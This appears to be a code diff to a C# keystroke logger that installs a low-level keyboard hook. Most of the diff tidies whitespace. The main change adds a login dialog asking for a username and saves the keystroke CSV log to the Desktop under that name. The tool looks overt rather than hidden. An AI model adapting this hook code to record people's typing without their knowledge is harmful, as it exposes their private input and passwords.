@@ -70,7 +70,7 @@ namespace dotnet_keylogger
              * ULONG_PTR dwExtraInfo = Pointer to extra info
              */
 
-            
+
             if (nCode >= 0)
             {
                 long diff = 0;
@@ -89,7 +89,7 @@ namespace dotnet_keylogger
                 }
                 else
                 {
-                    if (timestamp < lastMsgTime) {diff = (timestamp + (2147483647 - lastMsgTime)); } //long max wrap
+                    if (timestamp < lastMsgTime) { diff = (timestamp + (2147483647 - lastMsgTime)); } //long max wrap
                     else { diff = timestamp - lastMsgTime; }
                     currentTime = currentTime.AddMilliseconds(diff);
                 }
@@ -105,7 +105,7 @@ namespace dotnet_keylogger
                             break;
                         case (int)VirtualKeyStates.VK_RALT:
                             if (right_alt == 1)
-                            { return CallNextHookEx(_hookID, nCode, wParam, lParam);}
+                            { return CallNextHookEx(_hookID, nCode, wParam, lParam); }
                             right_alt = 1;
                             break;
                         case (int)VirtualKeyStates.VK_LCON:
@@ -225,13 +225,27 @@ namespace dotnet_keylogger
             }
         }
 
+        private static string ObtainUsername()
+        {
+            string username = "";
+            while (username == "" || username is null )
+            {
+                var login = new Login();
+                login.ShowDialog();
+                username = login.ReturnVal;
+            }
+            return username;
+        }
+
         public static void Main ()
             {
             string pname = System.Diagnostics.Process.GetCurrentProcess().ProcessName;
             Process[] p = Process.GetProcessesByName(pname);
             if (p.Length > 1)
                 Environment.Exit(0); /// already running, time to go bye bye
-            string filepath = @"C:\keylog_" + pname + "_" + Environment.UserName + @"_v2.csv";
+            string username = ObtainUsername();
+            string filepath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) +
+                @"\keylog_" + pname + "_" + username + @".csv";
             if (!File.Exists(filepath)) { newfile = true; }
             sw = new StreamWriter(filepath, true);
             sw.AutoFlush = true;
